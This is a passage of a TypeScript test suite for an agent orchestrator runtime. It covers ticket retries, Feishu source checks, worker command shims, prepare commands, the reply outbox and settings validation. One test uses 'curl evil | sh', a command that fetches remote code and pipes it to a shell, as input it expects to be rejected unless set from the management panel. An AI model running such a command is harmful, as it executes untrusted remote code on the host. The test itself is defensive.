/**
 * 环境与基础设施（从 runtime.spec.ts 拆出）：在模拟 DeepSeek Harness 宿主上通过工具和 HTTP 运行整个应用——
 * 管理 API 与 HTTP 面、重试与不可用评估、重启后的等待与阻塞派工、损坏来源隔离、
 * 环境失败、设置预检与账户 CLI 检查、暂停与恢复、worker 垫片与环境恢复、外来文件、
 * 被阻止命令垫片、prepare 命令、回复问题与撤回竞态、outbox 与同一会话的消息顺序、
 * 多张已结束工单的恢复、设置保存的 4xx、状态目录锁、提示词大小上限、
 * worker 重启恢复与启动退避、设置历史中的旧值，以及重启后的收件箱。
 */
import { readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs'
import { DatabaseSync } from 'node:sqlite'
import { delimiter, join } from 'node:path'
import { Context } from '@deepseek-ai/cordis'
import { beforeEach, describe, expect, expectTypeOf, it, vi } from 'vitest'
import { jobRegistry } from './fixtures/host.ts'
import { reference, testMachine } from './fixtures/deployment.ts'
import { firstSource } from '../src/deployment.ts'
import { evalsHealth } from '../src/app/views/overview.ts'
import { Runtime } from '../src/app/runtime.ts'
import { SCHEMA_VERSION } from '../src/app/store.ts'
import { TextCache } from '../src/app/cache.ts'
import { KV } from '../src/kv.ts'
import { policyVersion, type SettingsOrigin } from '../src/policy.ts'
import { feishuKind } from '../src/sources/feishu.ts'
import { feishuChannel } from '../src/sources/feishu-trigger.ts'
import { Commands } from '../src/infra/commands.ts'
import { UserError, said, waitsForPerson } from '../src/core/index.ts'
import { shellArgv, shimFile, workerGitConfig } from '../src/infra/environment.ts'
import { workerDispatch } from '../src/infra/worker-sources.ts'
import { policyHistory } from '../src/app/settings-history.ts'
import { decisionList, search, threadDetail, threadList } from '../src/app/views/threads.ts'
import { ticketDetail, ticketList } from '../src/app/views/tickets.ts'
import { runtimeHost } from './fixtures/runtime-host.ts'

const h = runtimeHost()
const { api, runTool, receive, relays, feishu, feishuFrom, addFeishuSource, route, acceptedTicket, viewsOf, overviewOf, restart, OTHER, BOT, subprocess, CHAT } = h
it('projects read models for the management page and removes thread subscriptions from the Web surface', async () => {
  const { ticket, trigger } = await acceptedTicket()
  const threadKeyValue = `feishu:${CHAT}:om_1`
  expect(overviewOf(h.runtime)).toMatchObject({ person: [], executor: { queued: 0, maxWorkers: 3, idle: 0 }, flow: { received: 0, accepted: 0, judged: 0 } })
  expect(ticketList(viewsOf(h.runtime), 'working', 0, 20).items).toEqual([expect.objectContaining({ id: ticket.id, stage: 'working' })])
  expect(ticketList(viewsOf(h.runtime), 'open', 0, 20).items).toEqual([expect.objectContaining({ id: ticket.id, stage: 'working', sessionId: `worker-${ticket.id}`, strength: 'explicit' })])
  expect(ticketDetail(viewsOf(h.runtime), ticket.id)).toMatchObject({ mandate: { strength: 'explicit' }, decision: { kind: 'accept' }, threads: [expect.objectContaining({ key: threadKeyValue, title: '@bot 修一下回归' })], channels: [expect.objectContaining({ source: 'feishu' })] })
  const follow = feishu('20', '补充：日志在这里', { mentions: [], root_id: 'om_1', sender_id: 'ou_guest' })
  await receive(follow)
  expect(threadList(viewsOf(h.runtime), 'subscribed', 0, 20).items).toEqual([expect.objectContaining({ key: threadKeyValue, lastAt: follow.at, tickets: [{ id: ticket.id, title: '修复回归', state: 'open' }] })])
  const detail = threadDetail(viewsOf(h.runtime), threadKeyValue, undefined, 50)!
  expect(detail.timeline.map(item => item.id)).toEqual([trigger.id, follow.id])
  expect(detail.timeline[0]!.disposition).toMatchObject({ decision: { outcome: 'accept', ticketId: ticket.id } })
  expect(detail.timeline[1]!.disposition).toMatchObject({ fanout: [ticket.id] })
  expect(search(viewsOf(h.runtime), '日志在这里', new TextCache(0)).items).toEqual([expect.objectContaining({ id: follow.id, threads: [threadKeyValue], threadTitle: '@bot 修一下回归' })])
  expect(decisionList(viewsOf(h.runtime), ['accept'], 0, 10)).toEqual({ items: [expect.objectContaining({ kind: 'accept', ticketId: ticket.id, threadTitle: '@bot 修一下回归' })], next_offset: null })
  const thread = h.runtime.store.threads.get(threadKeyValue)!
  h.runtime.store.threads.describe(thread.key, { label: 'Named by its source' })
  expect(threadList(viewsOf(h.runtime), 'all', 0, 20).items[0]).toMatchObject({ title: 'Named by its source' })
  expect((await api('GET', 'state')).body).not.toHaveProperty('tickets')
  // scripts/dsh-superagent 和 agents 从 GET state 读取健康状态（docs/006，管理 API）；设置及其修订版本有自己的路由。
  expect((await api('GET', 'state')).body).toMatchObject({ health: { runtime: { state: expect.any(String) } }, paused: false, load: { maxWorkers: 3 } })
  expect((await api('GET', 'settings')).body).toMatchObject({ sources: expect.arrayContaining([expect.objectContaining({ id: 'feishu',
    revision: expect.any(Number), value: expect.objectContaining({ enabled: true }) })]), projects: [],
    codeRepoKinds: expect.arrayContaining([expect.objectContaining({ kind: 'github' })]), blocks: { policy: { revision: expect.any(Number) } } })
  expect((await api('POST', `threads/${encodeURIComponent(threadKeyValue)}/unsubscribe`)).body).toMatchObject({ removed: true })
  expect(threadList(viewsOf(h.runtime), 'subscribed', 0, 20).items).toEqual([])
  expect(h.agents.get(h.runtime.masterId)!.inject).toHaveBeenCalled()
})

it('retries only a failed, blocked or undelivered ticket with a new assignment, and finds tickets by title in search, and reports unavailable Evals as a problem', async () => {
  const { ticket } = await acceptedTicket()
  expect(() => h.runtime.engine.retryTicket(ticket.id)).toThrow(new UserError('notRetryable'))
  const current = h.runtime.store.tickets.get(ticket.id)!
  await runTool(`worker-${ticket.id}`, 'orchestrator_report', { state: 'failed', summary: 'LlmError: offline' })
  expect(waitsForPerson(h.runtime.store.tickets.get(ticket.id)!)).toBe(true)
  // 人可以在其会话中继续失败的 worker；只有已结束的工单才会锁定其工具。
  expect(h.guards.get(`worker-${ticket.id}`)!()).toBeUndefined()
  const retried = await h.runtime.engine.retryTicket(ticket.id)
  await h.runtime.idle()
  expect(waitsForPerson(h.runtime.store.tickets.get(ticket.id)!)).toBe(false)
  expect(h.runtime.store.tickets.get(ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'running'])
  expect(retried.assignments.length).toBeGreaterThan(current.assignments.length)
  expect(retried.assignments.at(-2)!.endedReason).toBe('retried')
  // worker 的会话保存着派工，因此新的派工只说有人重试了它。
  expect(relays(`worker-${ticket.id}`).at(-1)).toEqual({ ticket_id: ticket.id, assignment: 2, note: expect.stringContaining('A person retried this ticket') })
  // 有人删除的会话会随下一个派工再次收到完整的首条消息。
  h.runtime.store.atomic(() => { h.runtime.engine.report(ticket.id, { state: 'failed', summary: 'LlmError: offline' }) })
  h.agents.delete(`worker-${ticket.id}`)
  h.runtime.engine.retryTicket(ticket.id)
  await h.runtime.idle()
  expect(relays(`worker-${ticket.id}`).at(-1)).toMatchObject({ ticket_id: ticket.id, title: '修复回归', trigger: expect.objectContaining({ text: '@bot 修一下回归' }) })
  expect(search(viewsOf(h.runtime), '修复', new TextCache(0)).tickets).toEqual([expect.objectContaining({ id: ticket.id })])
  expect(decisionList(viewsOf(h.runtime), [], 0, 10, '2999-01-01T00:00:00Z').items).toEqual([])
  const accepted = h.runtime.store.read.recentDecisions(0, 1)[0]!
  h.runtime.store.decisions.save({ ...accepted, id: 'unavailable-1', kind: 'unavailable', reason: [{ code: 'timeout' }], at: new Date().toISOString() })
  const unjudged = () => overviewOf(h.runtime).problems.filter(problem => problem.kind === 'eval-unavailable')
  expect(unjudged()).toEqual([expect.objectContaining({ thread: expect.objectContaining({ key: accepted.threadKey }), reason: [{ code: 'timeout' }], triggerId: accepted.triggerIds[0] })])
  // 健康状态会在一小时内将其显示为错误，`status` 会报告它，而概览上不会作为运行时错误显示。
  expect(evalsHealth(h.runtime.store)).toMatchObject({ state: 'error', detail: expect.stringContaining('Assessment timed out') })
  expect(evalsHealth(h.runtime.store, Date.now() + 3_700_000)).toMatchObject({ state: 'ready' })
  await h.runtime.pump()
  expect(h.runtime.health.evals).toMatchObject({ state: 'error' })
  expect(overviewOf(h.runtime).problems.filter(problem => problem.kind === 'runtime-error')).toEqual([])
  // 人的忽略会移除它，而不产生新的判断；只有不可用的评估才能被忽略。
  expect(await api('POST', `decisions/${accepted.id}/dismiss`)).toMatchObject({ status: 404, body: { error: 'Unavailable Eval not found', code: 'unknownProblem' } })
  expect(await api('POST', 'decisions/unavailable-1/dismiss')).toEqual({ status: 200, body: { dismissed: true } })
  expect(unjudged()).toEqual([])
  expect(evalsHealth(h.runtime.store)).toMatchObject({ state: 'ready' })
  expect(h.runtime.store.decisions.get('unavailable-1')).toMatchObject({ dismissed: true })
  h.runtime.store.decisions.save({ ...h.runtime.store.decisions.get('unavailable-1')!, dismissed: undefined })
  expect(unjudged()).toHaveLength(1)
  // 之后对同一线程的判断会解决它。
  h.runtime.store.decisions.save({ ...accepted, id: 'ignore-2', kind: 'ignore', reason: [said('context only')], at: new Date().toISOString() })
  expect(unjudged()).toEqual([])
})

it('leaves waiting and blocked assignments alone after a restart and keeps blocked workers paused', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'blocked', summary: 'need credentials' })
  h.runtime.executor.resume()
  expect(h.runtime.store.tickets.get(ticket.id)!.assignments).toHaveLength(1)
  expect(waitsForPerson(h.runtime.store.tickets.get(ticket.id)!)).toBe(true)
  await addFeishuSource('feishu-work')
  const other = await acceptedTicket(feishuFrom('feishu-work', '12', '@bot 另一个', { root_id: undefined }))
  await runTool(other.sessionId, 'orchestrator_report', { state: 'progress', summary: 'midway' })
  h.runtime.executor.resume()
  expect(h.runtime.store.tickets.get(other.ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'pending'])
})

it('excludes only the broken Feishu source and keeps the runtime running', async () => {
  // 损坏的飞书机器人会把飞书排除在外并说明原因；其余机器级初始化照常完成。
  h.answers = { ...h.answers, [`${BOT()} config strict-mode`]: 'strict-mode: off (source: profile)' }
  const next = await restart()
  await next.ready
  expect(next.configured()).toBe(true)
  expect(firstSource(next.deployment, 'feishu')).toBeUndefined()
  expect(next.feishuProblem).toMatchObject({ place: 'feishu', code: 'feishuUserIdentity', values: { mode: 'off' } })
})

it('reports a failure to write the agent environment as environmentFailed and leaves this process\'s environment as it was', async () => {
  await h.runtime.stop()
  // 无法创建垫片目录：一个文件占用了它的名字。
  rmSync(join(h.directory, 'worker-bin'), { recursive: true, force: true })
  writeFileSync(join(h.directory, 'worker-bin'), '')
  const environment = { ...process.env }
  const next = await restart()
  await next.ready
  expect(next.setupProblem).toMatchObject({ place: 'deployment', code: 'environmentFailed',
    values: { output: expect.stringContaining('EEXIST') } })
  expect(process.env).toEqual(environment)
})

it('saves settings while another record has a setup problem', async () => {
  h.answers = { ...h.answers, [`${BOT()} config strict-mode`]: 'strict-mode: off (source: profile)' }
  const next = await restart()
  await next.ready
  expect(next.feishuProblem).toMatchObject({ code: 'feishuUserIdentity' })
  next.sources.register(feishuKind)
  const block = next.settings.block('executor')
  const value = block.value as { maxWorkers: number }
  expect(await next.settings.save('executor', { ...value, maxWorkers: 2 }, block.revision, 'panel'))
    .toMatchObject({ saved: true })
})

it('lets only the panel change the execution environment, since it decides what runs as a shell command and which CLIs workers reach', async () => {
  const executor = () => h.runtime.store.settings().executor
  const save = (value: Record<string, unknown>, origin: SettingsOrigin) => h.runtime.settings.save('executor', { ...executor(), ...value }, h.runtime.store.blockRevision('executor'), origin)
  for (const origin of ['tool', 'sync'] as const) {
    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
  }
  expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
  expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
  expectTypeOf(h.runtime.settings.save).parameter(3).toEqualTypeOf<SettingsOrigin>()
  expectTypeOf(h.runtime.settings.pause).parameter(1).toEqualTypeOf<SettingsOrigin>()
})

it('checks a changed account CLI before saving it, restarts after the save, and lets only the panel change it', async () => {
  const save = (config: Record<string, unknown>, origin: SettingsOrigin = 'panel') => h.runtime.settings.save('source:feishu',
    { name: h.runtime.store.settings().sources.feishu!.name, enabled: true, config: { ...h.runtime.store.settings().sources.feishu!.config, ...config } }, h.runtime.store.blockRevision('source:feishu'), origin)
  await expect(save({ cli: OTHER() }, 'tool')).rejects.toThrow('can only be changed in the management panel')
  h.answers[`${OTHER()} config strict-mode`] = 'strict-mode: off (source: profile)'
  await expect(save({ cli: OTHER() })).rejects.toMatchObject({ code: 'feishuUserIdentity', values: { mode: 'off' } })
  expect(h.restarts).not.toHaveBeenCalled()
  h.answers[`${OTHER()} config strict-mode`] = 'strict-mode: bot (source: profile)'
  expect(await save({ cli: OTHER() })).toMatchObject({ saved: true, restarting: true })
  await vi.waitFor(() => expect(h.restarts).toHaveBeenCalledTimes(1))
  // 来源的其他字段无需重启即可生效。
  expect(await save({ directMessages: false })).toMatchObject({ saved: true, restarting: false })
  expect(h.restarts).toHaveBeenCalledTimes(1)
  expect((await h.runtime.settings.save('executor', { ...h.runtime.store.settings().executor, prepare: 'true' }, h.runtime.store.blockRevision('executor'), 'panel')).restarting).toBe(false)
  // 账户检查期间对另一个块的保存会被保留：先运行检查，然后保存合并。
  const pending = save({ cli: BOT() })
  await h.runtime.settings.save('policy', { ...h.runtime.store.settings().policy, rules: [] }, h.runtime.store.blockRevision('policy'), 'panel')
  await pending
  expect(h.runtime.store.settings().policy.rules).toEqual([])
  expect(h.runtime.store.settings().sources.feishu!.config).toMatchObject({ cli: BOT() })
  const feishuSave = (cli: string) => h.runtime.settings.save('source:feishu', { name: h.runtime.store.settings().sources.feishu!.name, enabled: true, config: { ...h.runtime.store.settings().sources.feishu!.config, cli } },
    h.runtime.store.blockRevision('source:feishu'), 'panel')
  expect(await feishuSave('')).toMatchObject({ restarting: true })
  h.answers[`${BOT()} config strict-mode`] = 'strict-mode: off (source: profile)'
  await expect(feishuSave(BOT())).rejects.toMatchObject({ code: 'feishuUserIdentity', values: { mode: 'off' } })
})

it('pauses and resumes processing as its own action, a setting outside every block, which keeps an Executor settings draft valid', async () => {
  const revision = h.runtime.store.blockRevision('executor')
  expect(await h.runtime.settings.pause(true, 'panel')).toEqual({ paused: true })
  expect(h.runtime.store.settings().paused).toBe(true)
  expect(h.runtime.store.blockRevision('executor')).toBe(revision)
  // 暂停前开始的执行器设置草稿仍可保存，并保留暂停；执行器块没有暂停。
  const draft = h.runtime.store.settings().executor
  await expect(h.runtime.settings.save('executor', { ...draft, paused: false }, revision, 'panel')).rejects.toThrow('paused')
  await h.runtime.settings.save('executor', { ...draft, maxWorkers: 5 }, revision, 'panel')
  expect(h.runtime.store.settings()).toMatchObject({ paused: true, executor: { maxWorkers: 5 } })
  // 编排器通过设置工具的暂停块以同样方式暂停和恢复。
  await runTool(h.runtime.masterId, 'orchestrator_settings_save', { block: 'pause', value: { paused: false }, revision: 0 })
  expect(h.runtime.store.settings().paused).toBe(false)
})

it('runs setup again while the Feishu bot check failed', async () => {
  h.answers[`${BOT()} config strict-mode`] = 'strict-mode: off (source: profile)'
  const next = await restart()
  await next.ready
  expect(next.configured()).toBe(true)
  expect(next.feishuProblem?.code).toBe('feishuUserIdentity')
  next.checkSetup()
  await vi.waitFor(() => expect(h.restarts).toHaveBeenCalledTimes(1))
})

it('writes worker shims that dispatch by Source record, and restores the environment on stop', async () => {
  const bin = join(h.directory, 'worker-bin')
  const records = () => JSON.parse(readFileSync(join(h.directory, 'worker-sources.json'), 'utf8')) as { clis: Record<string, { kind: string; cli: string }> }
  // 垫片不绑定任何记录：它把命令交给调度器，由调度器按工单目录选择该记录的 CLI。
  expect(readdirSync(bin).sort()).toEqual([shimFile('gh'), shimFile('lark-cli')])
  expect(readFileSync(join(bin, shimFile('lark-cli')), 'utf8')).toContain(workerDispatch(h.directory))
  expect(records().clis).toMatchObject({ feishu: { kind: 'feishu', cli: BOT() } })
  expect(records().clis).not.toHaveProperty('github')
  h.runtime.store.saveSettings({ ...h.runtime.store.settings(), executor: { ...h.runtime.store.settings().executor, blockedCommands: ['personal-gh'] } })
  const next = await restart({}, { feishu: null })
  await next.ready
  expect(readdirSync(bin).sort()).toEqual([shimFile('gh'), shimFile('lark-cli'), shimFile('personal-gh')])
  expect(readFileSync(join(bin, shimFile('personal-gh')), 'utf8')).toContain('personal-gh is blocked in this installation; no GitHub Source is configured.')
  // 没有飞书记录时记录表不再提供 feishu，调度器于是让 lark-cli 以「没有 Feishu Source」失败。
  expect(records().clis).not.toHaveProperty('feishu')
  expect(readFileSync(workerDispatch(h.directory), 'utf8')).toContain('is unavailable: this installation has no ')
  expect(readFileSync(join(bin, shimFile('gh')), 'utf8')).toContain(workerDispatch(h.directory))
  // 没有代码仓库来源时不会为任何主机写凭据助手，但仍会重置全局 helper。
  const config = readFileSync(workerGitConfig(h.directory), 'utf8')
  expect(config).toContain('[credential]\n\thelper =')
  expect(config).not.toContain('[credential "https://github.com"]')
  expect(process.env).toMatchObject({ GIT_CONFIG_GLOBAL: workerGitConfig(h.directory), GIT_CONFIG_NOSYSTEM: '1' })
  expect(process.env.GIT_AUTHOR_NAME).toBeUndefined()
  expect(process.env.PATH?.split(delimiter)[0]).toBe(bin)
  await next.stop()
  expect(process.env.GIT_CONFIG_GLOBAL).toBeUndefined()
  expect(process.env.PATH?.split(delimiter)).not.toContain(bin)
})

it('waits for setup when the shim directory holds a file dsh-superagent did not write, and leaves the file alone', async () => {
  writeFileSync(join(h.directory, 'worker-bin', 'my-script'), '#!/bin/sh\n')
  const next = await restart()
  await next.ready
  expect(next.configured()).toBe(false)
  expect(next.setupProblem).toMatchObject({ place: 'deployment', code: 'foreignFile', values: { file: join(h.directory, 'worker-bin', 'my-script') } })
  expect(readFileSync(join(h.directory, 'worker-bin', 'my-script'), 'utf8')).toBe('#!/bin/sh\n')
  await next.stop()
})

it('rewrites the blocked-command shims when the Executor settings change them, without a restart', async () => {
  const bin = join(h.directory, 'worker-bin')
  const save = (blockedCommands: string[]) => h.runtime.settings.save('executor', { ...h.runtime.store.settings().executor, blockedCommands }, h.runtime.store.blockRevision('executor'), 'panel')
  expect(await save(['personal-gh'])).toMatchObject({ saved: true, restarting: false })
  expect(readdirSync(bin).sort()).toEqual([shimFile('gh'), shimFile('lark-cli'), shimFile('personal-gh')])
  await save([])
  expect(readdirSync(bin).sort()).toEqual([shimFile('gh'), shimFile('lark-cli')])
  // worker 所需的命令无法被阻止。
  await expect(save(['gh'])).rejects.toThrow()
  expect(h.restarts).not.toHaveBeenCalled()
})

it('runs the prepare command once for a new ticket, in its project directory with the ticket\'s environment, and fails the ticket with its output', async () => {
  const prepare = (command: string) => h.runtime.store.saveSettings({ ...h.runtime.store.settings(), executor: { ...h.runtime.store.settings().executor, prepare: command } })
  const runs = () => subprocess.spawn.mock.calls.map(([spec]) => spec as { argv: string[]; cwd: string; env?: Record<string, string> }).filter(spec => spec.argv[0] === shellArgv('')[0])
  prepare('git -C /srv/widgets worktree add "$DSH_SUPERAGENT_DIR" -b "agent/$DSH_SUPERAGENT_NAME"')
  const { ticket } = await acceptedTicket()
  // 准备命令在项目目录中运行，由它创建本工单自己的子目录。
  expect(runs()).toEqual([expect.objectContaining({ argv: shellArgv('git -C /srv/widgets worktree add "$DSH_SUPERAGENT_DIR" -b "agent/$DSH_SUPERAGENT_NAME"'), cwd: join(h.directory, 'work', 'feishu'),
    env: expect.objectContaining({ DSH_SUPERAGENT_DIR: ticket.execution!.directory, DSH_SUPERAGENT_NAME: ticket.execution!.name, DSH_SUPERAGENT_SOURCE: 'feishu', DSH_SUPERAGENT_FEISHU_CHAT: CHAT }) })])
  // 重试会复用该工单已准备好的子目录，不再运行准备命令。
  await runTool(`worker-${ticket.id}`, 'orchestrator_report', { state: 'failed', summary: 'offline' })
  await h.runtime.engine.retryTicket(ticket.id)
  await h.runtime.idle()
  expect(runs()).toHaveLength(1)
  h.answers[shellArgv('exit 3').join(' ')] = new Error('fatal: no such clone')
  prepare('exit 3')
  // 另一条飞书记录属于另一个项目，因此它的准备失败会让工单失败，而不受前一张工单占用项目槽位的影响。
  await addFeishuSource('feishu-work')
  const failed = await acceptedTicket(feishuFrom('feishu-work', '9', '@bot 修一下标题'))
  await h.runtime.idle()
  expect(failed.ticket.execution!.directory).toBe(join(h.directory, 'work', 'feishu-work', failed.ticket.id))
  expect(h.runtime.store.tickets.get(failed.ticket.id)!.assignments.at(-1)).toMatchObject({ report: expect.objectContaining({ state: 'failed', summary: expect.stringContaining('The prepare command failed: fatal: no such clone') }) })
  expect(waitsForPerson(h.runtime.store.tickets.get(failed.ticket.id)!)).toBe(true)
})

it('counts a ticket whose directory the host prepared before prepare commands existed as prepared', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'failed', summary: 'offline' })
  // 来自 prepare 命令之前的工单有其工作树。
  const stored = h.runtime.store.tickets.get(ticket.id)!
  h.runtime.store.tickets.save({ ...stored, execution: { ...stored.execution!, directory: h.directory } })
  h.runtime.store.saveSettings({ ...h.runtime.store.settings(), executor: { ...h.runtime.store.settings().executor, prepare: 'exit 1' } })
  subprocess.spawn.mockClear()
  await h.runtime.engine.retryTicket(ticket.id)
  await h.runtime.idle()
  expect(subprocess.spawn.mock.calls.some(([spec]) => spec.argv[0] === shellArgv('')[0])).toBe(false)
  expect(h.runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.state).toBe('running')
})

it('shows a failed reply as a problem with its attempts, an error of the reply effects after three, until it is withdrawn', async () => {
  const { trigger } = await acceptedTicket()
  vi.spyOn(Commands.prototype, 'lark').mockRejectedValue(new Error('internal error (2200)'))
  h.runtime.outbox.send({ id: 'stuck', channel: trigger.channel!, text: '已合并。', kind: 'notice' })
  const outgoing = () => overviewOf(h.runtime).problems.filter(problem => problem.kind === 'outgoing')
  const at = async (ms: number) => {
    vi.useFakeTimers({ toFake: ['Date'], now: Date.now() + ms })
    try { await h.runtime.sendReplies() } finally { vi.useRealTimers() }
  }
  await h.runtime.sendReplies()
  expect(outgoing()).toEqual([{ kind: 'outgoing', outgoing: expect.objectContaining({ id: 'stuck', attempts: 1, error: expect.stringContaining('2200') }) }])
  expect(h.runtime.health.reply).toMatchObject({ state: 'ready', detail: expect.stringContaining('1 waiting') })
  // 其重试会在 5 秒后、再 10 秒后进行。
  await at(5000); await at(15_000)
  expect(h.runtime.health.reply).toMatchObject({ state: 'error', detail: expect.stringContaining('2200') })
  expect(h.runtime.health.runtime).toMatchObject({ state: 'ready' })
  // 被撤回的回复会连同其效果一起撤销，从而立即清除错误。
  h.runtime.outbox.withdraw('stuck')
  expect([outgoing(), h.runtime.health.reply, h.runtime.effects.pending('reply', 'stuck')])
    .toEqual([[], expect.objectContaining({ state: 'ready', detail: 'Nothing waiting' }), false])
})

it('keeps the receipt of a message withdrawn while it went out, so its id is not queued again', async () => {
  const { trigger } = await acceptedTicket()
  vi.spyOn(h.runtime.sources, 'send').mockImplementation(async message => { h.runtime.outbox.withdraw(message.id); return 'sent' })
  h.runtime.outbox.send({ id: 'raced', channel: trigger.channel!, text: 'Done', kind: 'reply' })
  await h.runtime.sendReplies()
  h.runtime.outbox.send({ id: 'raced', channel: trigger.channel!, text: 'Again', kind: 'reply' })
  expect([h.runtime.store.receipts.get('raced'), h.runtime.effects.pending('reply')]).toEqual([expect.objectContaining({ text: 'Done', status: 'sent' }), false])
})

it('resumes several ended tickets on one thread from one message without the launch waiting on itself', async () => {
  const first = await acceptedTicket()
  const other = feishu('30', '@bot 顺手把这里也改了', { root_id: undefined })
  await receive(other)
  await route({ kind: 'attach', ticket_id: first.ticket.id, trigger_id: other.id })
  // 第一个工单线程上的请求会在第一个工单的 worker 交回后成为那里的第二个工单。
  const another = feishu('31', '@bot 另一件事', { root_id: 'om_1' })
  await receive(another)
  await runTool(first.sessionId, 'orchestrator_trigger_handback', { trigger_id: another.id, reason: 'Another change.' })
  const second = await acceptedTicket(another)
  await runTool(first.sessionId, 'orchestrator_report', { state: 'dropped', summary: 'nothing to do' })
  // 同一项目串行：第一个工单交回并让出槽位后，第二个工单才开始。
  const firstAgent = h.agents.get(first.sessionId)! as { status: string }
  firstAgent.status = 'idle'
  ;(h.runtime as unknown as { ctx: Context }).ctx.emit('agent/status', { agent: firstAgent, status: 'idle' } as never)
  vi.useFakeTimers({ toFake: ['Date'], now: Date.now() + 6000 })
  try { await h.runtime.pump(); await h.runtime.idle() } finally { vi.useRealTimers() }
  await runTool(second.sessionId, 'orchestrator_report', { state: 'dropped', summary: 'nothing to do' })
  await receive(feishu('32', '还有问题', { mentions: [], root_id: 'om_1', sender_id: 'ou_guest' }))
  await vi.waitFor(() => expect([first, second].map(ticket => h.runtime.store.tickets.get(ticket.ticket.id)!.ended)).toEqual([undefined, undefined]), { timeout: 3000 })
  // 同一项目串行，因此只有一张工单能真正开始；关键是消息没有卡在启动等待上。
  await vi.waitFor(() => expect([first, second].map(ticket => h.runtime.store.tickets.get(ticket.ticket.id)!.assignments.at(-1)!.state)).toContain('running'), { timeout: 3000 })
  expect([first, second].map(ticket => h.runtime.store.tickets.get(ticket.ticket.id)!.assignments.at(-1)!.state)
    .every(state => state === 'running' || state === 'pending')).toBe(true)
})

it('attaches a message to an ended ticket and so resumes it', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'dropped', summary: 'nothing to do' })
  const other = feishu('40', '@bot 上次那个改动还要改一下', { root_id: undefined })
  await receive(other)
  await route({ kind: 'attach', ticket_id: ticket.id, trigger_id: other.id })
  await vi.waitFor(() => expect(h.runtime.store.tickets.get(ticket.id)!.ended).toBeUndefined())
  expect(h.runtime.store.tickets.get(ticket.id)!.assignments).toHaveLength(2)
})

it('refuses a settings save with an unknown model or a Source kind that is not installed, an oversized prompt, an unknown revision and a malformed path with 4xx', async () => {
  const request = async (method: string, path: string, body?: unknown) => {
    let status = 0, text = ''
    const chunks = body === undefined ? [] : [Buffer.from(JSON.stringify(body))]
    const req = { method, url: `/orchestrator/api/${path}`, headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' }, async *[Symbol.asyncIterator]() { yield* chunks } }
    await h.http(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
    return { status, body: JSON.parse(text) as Record<string, unknown> }
  }
  vi.mocked(h.services.llm as { resolveCallConfig: ReturnType<typeof vi.fn> }).resolveCallConfig.mockRejectedValueOnce(new Error('unknown provider nowhere'))
  const modelsBlock = { ...h.runtime.store.settings().models, worker: { provider: 'nowhere', model: 'x' } }
  expect(await request('PUT', 'settings/models', { value: modelsBlock, revision: h.runtime.store.blockRevision('models') }))
    .toMatchObject({ status: 400, body: { code: 'modelUnavailable', values: { block: 'models', error: 'unknown provider nowhere' } } })
  const stored = h.runtime.store.settings()
  h.runtime.store.saveSettings({ ...stored, sources: { ...stored.sources, slack: { kind: 'slack', name: 'Slack', enabled: false, config: {} } } })
  expect(await request('PUT', 'settings/source:slack', { value: { name: 'Slack', enabled: true, config: {} }, revision: 0 }))
    .toMatchObject({ status: 400, body: { code: 'sourceNotInstalled', values: { source: 'slack' } } })
  const huge = { ...h.runtime.prompts.current().config, delivery: 'x'.repeat(h.runtime.machine.promptMaxChars.get()) }
  expect(await request('POST', 'prompts/preview', huge)).toMatchObject({ status: 400, body: { code: 'promptTooLong' } })
  expect(await request('PUT', 'prompts', { config: huge, baseRevision: h.runtime.prompts.current().revision })).toMatchObject({ status: 400, body: { code: 'promptTooLong' } })
  // 对当前版本没有的部件的覆盖会被拒绝，而不是缺失。
  expect(await request('PUT', 'prompts', { config: { ...h.runtime.prompts.current().config, overrides: { 'runtime/nothing': { text: 'x' } } },
    baseRevision: h.runtime.prompts.current().revision })).toMatchObject({ status: 400, body: { code: 'unknownPromptPart' } })
  expect(await request('GET', 'prompts?revision=99')).toMatchObject({ status: 404, body: { code: 'unknownPromptRevision' } })
  expect(await request('GET', 'threads/%E0%A4%A')).toEqual({ status: 400, body: { error: 'A path segment has a malformed escape' } })
})

it('refuses a second process on the same state directory before it opens the database', () => {
  // 第二个进程不打开数据库，因此其中的记录保持原样。
  const db = new DatabaseSync(join(h.directory, 'orchestrator.sqlite'))
  db.prepare("UPDATE kv SET value='10' WHERE key='schema'").run()
  db.close()
  const ctx = new Context()
  for (const [name, service] of Object.entries(h.services)) ctx.reflect.provide(name, service)
  expect(() => new Runtime(ctx, testMachine({ stateDir: h.directory }), vi.fn())).toThrow(/already being held/)
  expect(h.runtime.store.get(KV.store.schema)).toBe(10)
  h.runtime.store.set(KV.store.schema, SCHEMA_VERSION)
})

it('applies a changed prompt size limit to the next save and request without a restart', async () => {
  const limit = reference(100000)
  const next = await restart({ promptMaxChars: limit })
  await next.ready
  const put = async (config: unknown) => {
    let status = 0, text = ''
    const chunks = [Buffer.from(JSON.stringify({ config, baseRevision: next.prompts.current().revision }))]
    const req = { method: 'PUT', url: '/orchestrator/api/prompts', headers: { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' }, async *[Symbol.asyncIterator]() { yield* chunks } }
    await h.http(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
    return { status, body: JSON.parse(text) as Record<string, unknown> }
  }
  const config = next.prompts.current().config
  const size = JSON.stringify(config).length
  expect(await put({ ...config, delivery: 'x'.repeat(size) })).toMatchObject({ status: 200 })
  // 加载器会就地提交更低的上限；下一次保存会读取它。
  limit.set(size + 1000)
  expect(await put({ ...config, delivery: `${config.delivery}${'y'.repeat(2000)}` }))
    .toMatchObject({ status: 400, body: { code: 'promptTooLong', values: { limit: String(size + 1000) } } })
  // 请求体上限也一样，每个字符四字节再加余量。
  const bytes = 4 * (size + 1000) + 4096
